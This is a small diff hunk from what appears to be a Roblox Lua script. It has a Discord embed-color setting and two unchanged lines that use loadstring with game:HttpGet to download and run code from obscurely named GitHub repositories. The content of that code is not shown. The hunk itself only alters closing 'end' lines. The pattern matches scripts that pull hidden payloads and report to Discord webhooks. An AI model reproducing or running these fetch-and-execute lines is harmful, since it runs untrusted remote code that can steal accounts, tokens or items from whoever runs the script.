@@ -979,5 +979,5 @@ EmbedColor = "16763904"; -- Color from Discohook.org. / It's an Decimal color. U
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Th12353/fghdsgsfhhsjh/main/server"))('Made by powerless :)')
 loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/Th12353/heesj/main/Fkofqwekwodf"))('pizzapie')
-end)
-    end
+end
+    
